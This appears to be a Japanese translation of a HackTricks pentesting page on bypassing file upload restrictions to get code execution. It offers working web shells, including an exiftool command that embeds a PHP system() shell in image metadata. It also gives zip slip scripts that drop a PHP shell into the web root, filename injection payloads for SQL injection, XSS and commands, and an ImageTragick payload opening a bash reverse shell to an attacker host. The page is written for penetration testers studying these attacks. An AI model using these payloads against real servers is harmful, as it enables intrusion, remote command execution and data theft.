<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンを入手したり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！

- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。

- [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。

- [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter**で[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**をフォロー**してください。

- **ハッキングのトリックを共有するには、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)にPRを提出**してください。

</details>


# ファイルのアップロード一般的な手法

1. **ダブル拡張子**を持つファイルをアップロードしてみてください（例：_file.png.php_または_file.png.php5_）。
* PHPの拡張子：_.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, ._phps_, ._pht_, _.phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc_
* ASPの拡張子：_.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .asp, .cer, .shtml_
2. 拡張子の一部を**大文字**にしてみてください。例：_.pHp, .pHP5, .PhAr ..._
3. **ダブル（またはそれ以上の）拡張子**をアップロードしてみてください（特定の拡張子が存在するかどうかをテストするミス構成のチェックをバイパスするのに役立ちます）：
1. _file.png.php_
2. _file.png.txt.php_
4. **逆ダブル拡張子**をアップロードしてみてください（Apacheのミス構成を悪用するのに役立ちます。拡張子_.php_である必要はありませんが、コードが実行されます）：
* 例：file.php.png
5. **ヌル文字**を使用したダブル拡張子：
1. 例：file.php%00.png
6. 拡張子の**末尾に特殊文字を追加**してください：_％00, ％20, （いくつかのドット）...._
1. _file.php%00_
2. _file.php%20_
3. _file.php...... --&gt; Windowsでは、ファイルが末尾にドットで作成されると、それらは削除されます（.phpとしての拡張子をチェックするフィルタをバイパスできます）_
4. _file.php/_
5. _file.php.\_
7. **Content-Type**ヘッダの**値**を設定することで、**Content-Type**のチェックをバイパスしてください：_image/png_、_text/plain_、_application/octet-stream_
8. **マジックナンバーチェック**をバイパスするために、ファイルの先頭に**実際の画像のバイト**を追加してください（_file_コマンドを混乱させます）。または、シェルを**メタデータ**に挿入します：`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`
1. ファイル内のどこにでもそれらを設定できるため、**マジックバイト**がファイルで**チェックされている**可能性もあります。
9. **Windows**の**NTFS代替データストリーム（ADS）**を使用します。この場合、禁止された拡張子の後ろにコロン文字「:」が挿入されます。その結果、サーバー上に禁止された拡張子の**空のファイル**が作成されます（例：「file.asax:.jpg」）。このファイルは、その後他のテクニックを使用して編集することもできます。たとえば、その短いファイル名を使用することです。また、「**::$data**」パターンを使用して空でないファイルを作成することもできます。したがって、このパターンの後にドット文字を追加することも、さらなる制限をバイパスするのに役立つ場合があります（例：「file.asp::$data.」）。
10. 許可された拡張子（_png_）でバックドアを**アップロード**し、バックドアが実行される**ミス構成**を祈ります。
11. 既にアップロードされたファイルを**リネーム**する脆弱性を見つけます（拡張子を変更するため）。
12. **ローカルファイルインクルージョン**の脆弱性を見つけてバックドアを実行します。
13. **可能な情報漏洩**：
1. **同じ名前**の**同じファイル**を**複数回**（**同時に**）アップロードします。
2. **既に存在するファイル**または**フォルダ**の**名前**を持つファイルをアップロードします。
3. **“.”、“..”、“…”**を名前とするファイルをアップロードします。たとえば、**Windows**のApacheでは、アプリケーションがアップロードされたファイルを「/www/uploads/」ディレクトリに保存する場合、「.」のファイル名は「/www/」ディレクトリに「uploads」という名前のファイルを作成します。
4. **NTFS**で**削除が容易でない**ファイルをアップロードします。例：「…:.jpg」（Windows）
5. 名前に`|<>*?”`などの**無効な文字**を含む**Windows**でのファイルのアップロード（Windows）
6. **CON、PRN、AUX、NUL、COM1、COM2、COM3、COM4、COM5、COM6、COM7、COM8、COM9、LPT1、LPT2、LPT3、LPT4、LPT5、LPT6、LPT7、LPT8、LPT9**などの**予約済み（禁止）名**を使用して**Windows**にファイルをアップロードします。

また、誤って
`.phar`ファイルは、Javaの`.jar`に似ていますが、PHP用であり、**PHPファイルのように使用**できます（PHPで実行するか、スクリプト内に含めるなど）。

`.inc`拡張子は、**ファイルのインポート**にのみ使用されることがありますので、ある時点で、誰かが**この拡張子を実行できるように許可**している可能性があります。

**BurpSuitプラグインを使用して、多くの可能なファイルアップロードの脆弱性をチェック**してください：[**https://github.com/modzero/mod0BurpUploadScanner**](https://github.com/modzero/mod0BurpUploadScanner) **または、アップロード可能なファイルを見つけ、コードを実行するためのさまざまなトリックを試すコンソールアプリケーションを使用してください：**[**https://github.com/almandin/fuxploider**](https://github.com/almandin/fuxploider)

## **wgetファイルアップロード/SSRFトリック**

場合によっては、サーバーが**`wget`**を使用してファイルを**ダウンロード**しており、**URL**を指定できることがあります。これらの場合、コードはダウンロードされるファイルの拡張子がホワイトリスト内にあることを確認して、許可されたファイルのみがダウンロードされるようにします。ただし、**このチェックはバイパスできます。**
**Linux**での**ファイル名**の**最大**長さは**255**ですが、**wget**はファイル名を**236**文字に切り詰めます。**"A"\*232+".php"+".gif"**という名前のファイルをダウンロードできます。このファイル名は、この例では**".gif"**が**有効な**拡張子であるため、チェックを**バイパス**しますが、`wget`はファイルを**"A"\*232+".php"**に**リネーム**します。
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]
```
注意してください。このチェックをバイパスするために考えている**別のオプション**は、**HTTPサーバーを別のファイルにリダイレクト**させることです。そのため、初期のURLはチェックをバイパスしますが、wgetは新しい名前でリダイレクトされたファイルをダウンロードします。これは、wgetが**パラメータ**`--trust-server-names`と一緒に使用されている**場合を除いては機能しません**。なぜなら、wgetはリダイレクトされたページを元のURLで指定されたファイル名でダウンロードするからです。

# ファイルアップロードから他の脆弱性へ

* **ファイル名**を`../../../tmp/lol.png`に設定し、**パストラバーサル**を試みる
* **ファイル名**を`sleep(10)-- -.jpg`に設定し、**SQLインジェクション**を達成することができるかもしれません
* **ファイル名**を`<svg onload=alert(document.comain)>`に設定して、XSSを達成する
* **ファイル名**を`; sleep 10;`に設定して、いくつかのコマンドインジェクションをテストする（詳細は[こちら](command-injection.md)）
* [画像（svg）ファイルのアップロードにおける**XSS**](xss-cross-site-scripting/#xss-uploading-files-svg)
* **JS**ファイルの**アップロード**+**XSS** = [**Service Workers**の悪用](xss-cross-site-scripting/#xss-abusing-service-workers)
* [svgアップロードにおける**XXE**](xxe-xee-xml-external-entity.md#svg-file-upload)
* [svgファイルのアップロードによる**オープンリダイレクト**](open-redirect.md#open-redirect-uploading-svg-files)
* [有名な**ImageTrick**脆弱性](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
* ウェブサーバーに画像を取得させることができる場合、[SSRF](ssrf-server-side-request-forgery.md)を悪用することができます。この**画像**がいくつかの**公開**サイトに**保存**される場合、[https://iplogger.org/invisible/](https://iplogger.org/invisible/)からのURLを指定して、**すべての訪問者の情報を盗む**こともできます。

以下は、アップロードによって達成できるトップ10のことです（[リンク](https://twitter.com/SalahHasoneh1/status/1281274120395685889)から）：

1. **ASP / ASPX / PHP5 / PHP / PHP3**：Webシェル / RCE
2. **SVG**：格納型XSS / SSRF / XXE
3. **GIF**：格納型XSS / SSRF
4. **CSV**：CSVインジェクション
5. **XML**：XXE
6. **AVI**：LFI / SSRF
7. **HTML / JS**：HTMLインジェクション / XSS / オープンリダイレクト
8. **PNG / JPEG**：ピクセルフラッド攻撃（DoS）
9. **ZIP**：LFI経由のRCE / DoS
10. **PDF / PPTX**：SSRF / BLIND XXE

# ZIPファイルの自動解凍アップロード

サーバー内で解凍されるZIPをアップロードできる場合、2つのことができます：

## シンボリックリンク

他のファイルへのシンボリックリンクを含むリンクをアップロードし、解凍されたファイルにアクセスすることで、リンクされたファイルにアクセスできます：
```text
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
```
## 異なるフォルダで解凍する

解凍されたファイルは予期しないフォルダに作成されます。

OSレベルのコマンド実行から悪意のあるファイルのアップロードを保護するために、この設定が有効であると簡単に想像することができますが、残念ながらこれは真実ではありません。ZIPアーカイブ形式は階層的な圧縮をサポートしており、さらに上位のディレクトリを参照することもできるため、対象アプリケーションの解凍機能を悪用することで安全なアップロードディレクトリから脱出することができます。

この種のファイルを作成するための自動化されたエクスプロイトは、こちらで見つけることができます: [https://github.com/ptoomey3/evilarc](https://github.com/ptoomey3/evilarc)
```python
python evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
以下は、悪意のあるzipファイルを作成するためのPythonコードです。

```python
import zipfile

# Create a new zip file
zip_file = zipfile.ZipFile('malicious.zip', 'w')

# Add a file to the zip
zip_file.write('payload.txt')

# Add a malicious file to the zip
zip_file.writestr('../path/to/evil.txt', 'This file is malicious!')

# Close the zip file
zip_file.close()
```

このPythonコードは、`malicious.zip`という名前の新しいzipファイルを作成し、`payload.txt`というファイルを追加します。さらに、`../path/to/evil.txt`という悪意のあるファイルもzipに追加します。最後に、zipファイルを閉じます。
```python
#!/usr/bin/python
import zipfile
from cStringIO import StringIO

def create_zip():
f = StringIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
リモートコマンド実行を達成するために、以下の手順を実行しました：

1. PHPシェルを作成します：
```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```
2. 「ファイルスプレー」と呼ばれる手法を使用し、圧縮されたzipファイルを作成します:
```text
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# ls *.php
simple-backdoor.php  xxAxxAxxAcmd.php        xxAxxAxxAxxAxxAxxAcmd.php        xxAxxAxxAxxAxxAxxAxxAxxAxxAcmd.php
xxAcmd.php           xxAxxAxxAxxAcmd.php     xxAxxAxxAxxAxxAxxAxxAcmd.php     xxAxxAxxAxxAxxAxxAxxAxxAxxAxxAcmd.php
xxAxxAcmd.php        xxAxxAxxAxxAxxAcmd.php  xxAxxAxxAxxAxxAxxAxxAxxAcmd.php
root@s2crew:/tmp# zip cmd.zip xx*.php
adding: xxAcmd.php (deflated 40%)
adding: xxAxxAcmd.php (deflated 40%)
adding: xxAxxAxxAcmd.php (deflated 40%)
adding: xxAxxAxxAxxAcmd.php (deflated 40%)
adding: xxAxxAxxAxxAxxAcmd.php (deflated 40%)
adding: xxAxxAxxAxxAxxAxxAcmd.php (deflated 40%)
adding: xxAxxAxxAxxAxxAxxAxxAcmd.php (deflated 40%)
adding: xxAxxAxxAxxAxxAxxAxxAxxAcmd.php (deflated 40%)
adding: xxAxxAxxAxxAxxAxxAxxAxxAxxAcmd.php (deflated 40%)
adding: xxAxxAxxAxxAxxAxxAxxAxxAxxAxxAcmd.php (deflated 40%)
root@s2crew:/tmp#
```
3. ヘックスエディタまたはviを使用して、「xxA」を「../」に変更します。私はviを使用しました：
```text
:set modifiable
:%s/xxA/..\//g
:x!
```
完了！

あと一つのステップが残っています：ZIPファイルをアップロードし、アプリケーションに解凍させます！成功すれば、ウェブサーバーに十分な権限があれば、システム上に簡単なOSコマンド実行シェルが存在します：

[![b1](https://blog.silentsignal.eu/wp-content/uploads/2014/01/b1-300x106.png)](https://blog.silentsignal.eu/wp-content/uploads/2014/01/b1.png)

**参考**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

# ImageTragic

このコンテンツを画像拡張子でアップロードして、脆弱性 **\(ImageMagick , 7.0.1-1\)** を悪用します
```text
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
# PGNにPHPシェルを埋め込む

IDATチャンクにウェブシェルを配置する主な理由は、リサイズおよび再サンプリング操作をバイパスできるためです。PHP-GDには、これを行うための2つの関数、[imagecopyresized](http://php.net/manual/en/function.imagecopyresized.php)および[imagecopyresampled](http://php.net/manual/en/function.imagecopyresampled.php)が含まれています。

この投稿を読んでください：[https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

# ポリグロットファイル

セキュリティの文脈でのポリグロットとは、複数の異なるファイルタイプの有効な形式であるファイルのことを指します。例えば、[GIFAR](https://en.wikipedia.org/wiki/Gifar)はGIFファイルとRARファイルの両方です。また、GIFとJSの両方、PPTとJSの両方など、複数のファイルタイプであるファイルも存在します。

ポリグロットファイルは、ファイルタイプに基づく保護をバイパスするためによく使用されます。ユーザーが危険なファイル（JSファイル、PHPファイル、Pharファイルなど）をアップロードすることを防ぐために、多くのアプリケーションは特定のタイプ（JPEG、GIF、DOCなど）のみのアップロードを許可します。

これにより、複数の異なる形式のフォーマットに準拠したファイルをアップロードできます。JPEGのように見えるが、実際にはPHARファイル（PHp ARchive）であるファイルをアップロードすることができますが、有効な拡張子が必要であり、アップロード機能が許可しない場合は役に立ちません。

詳細はこちら：[https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)





<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- **サイバーセキュリティ企業**で働いていますか？ HackTricksであなたの会社を宣伝したいですか？または、**最新バージョンのPEASSを入手したり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！

- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。

- [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。

- [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**をフォローしてください**。

- **ハッキングのトリックを共有するには、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)にPRを提出してください**。

</details>
